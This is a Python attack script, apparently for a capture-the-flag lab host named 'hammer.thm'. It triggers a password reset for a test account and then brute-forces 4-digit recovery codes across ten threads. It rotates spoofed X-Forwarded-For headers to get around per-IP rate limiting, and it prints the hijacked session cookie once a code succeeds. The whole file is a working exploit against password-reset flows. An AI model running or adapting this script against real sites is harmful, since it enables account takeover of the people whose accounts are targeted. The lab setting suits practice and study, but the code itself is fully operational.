import requests
import threading

BASE_URL = "http://10.10.232.105:1337"
RESET_URL = f"{BASE_URL}/reset_password.php"
NUM_THREADS = 10
ATTEMPTS_PER_IP = 7

found = False
found_lock = threading.Lock()

session = requests.Session()

session.get(BASE_URL)

session.post(RESET_URL, data={"email": "tester@hammer.thm"})


def brute_force(thread_id, start_code, step):
    """Funkcja brute-force iterująca po kodach z odpowiednim zakresem."""
    global found

    ip_suffix = thread_id
    attempts = 0
    code = start_code

    while not found:
        code_str = f"{code:04d}"
        headers = {"X-Forwarded-For": f"127.0.0.{ip_suffix}"}

        try:
            response = session.post(RESET_URL, data={"recovery_code": code_str, "s": "178"}, headers=headers)
            
            print(f"[Thread-{thread_id}] Trying {code_str} from IP 127.0.0.{ip_suffix} | Status: {response.status_code}")

            if "Invalid or expired" in response.text:
                attempts += 1
                if attempts >= ATTEMPTS_PER_IP:
                    attempts = 0
                    ip_suffix += NUM_THREADS

                code += step

            else:
                with found_lock:
                    if not found:
                        found = True
                        print("\n" + "=" * 40)
                        print(f"[*] TOKEN FOUND by Thread-{thread_id}!!!!!")
                        print(f"[*] Correct Code: {code_str}")
                        print(f"[*] Session ID: {session.cookies}")
                        print("=" * 40 + "\n")
                        break

        except requests.exceptions.RequestException as e:
            print(f"[!] Error in Thread-{thread_id}: {e}")
            break

threads = []
for t in range(NUM_THREADS):
    start_code = t
    thread = threading.Thread(target=brute_force, args=(t, start_code, NUM_THREADS))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print("Brute-force finished.")
